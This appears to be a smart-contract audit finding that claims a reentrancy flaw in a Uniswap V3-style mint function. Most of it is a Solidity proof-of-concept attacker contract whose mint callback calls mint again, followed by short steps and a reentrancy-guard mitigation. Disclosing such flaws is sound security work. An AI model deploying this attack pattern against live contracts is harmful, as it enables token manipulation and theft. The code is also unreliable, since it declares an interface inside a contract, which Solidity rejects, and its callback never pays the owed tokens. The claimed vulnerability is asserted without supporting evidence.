# Vulnerability details

Impact: This can allow an attacker to manipulate the state or execute the mint function multiple times before the balance checks and updates, leading to unexpected behavior or token manipulation.

Proof of concept :pragma solidity^0.8.0;

interface IUniswapV3MintCallback {
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract Attacker {
    // Vulnerable contract interface
    interface IVulnerableContract {
        function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data) external;
    }

    IVulnerableContract vulnerableContract;
    address public target;

    constructor(address _target) {
        target = _target;
        vulnerableContract = IVulnerableContract(_target);
    }

    // This function is called by the vulnerable contract as part of the mint process
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Reentrant call to the vulnerable contract's mint function
        vulnerableContract.mint(msg.sender, 0, 1000, 100, data);
    }

    // Attack function to trigger the reentrancy attack
    function attack() external {
        // Amount to mint
        uint128 amount = 100;
        // Arbitrary data for the mint function
        bytes memory data = "";

        // Initiating the attack by calling the vulnerable contract's mint function
        vulnerableContract.mint(address(this), -1000, 1000, amount, data);
    }
}
In poc:
1.The Attacker contract contains a callback function uniswapV3MintCallback, which is designed to be called by the vulnerable contract during the minting process.

2.InsideuniswapV3MintCallback, the attacker reenters the vulnerable contract's mint function, triggering a reentrancy attack.
3.The attack function initiates the attack by calling the vulnerable contract's mint function with malicious parameters

Manual analysis. 

Mitigation: Apply a reentrancy guard and ensure state checks and updates occur before the external callback.
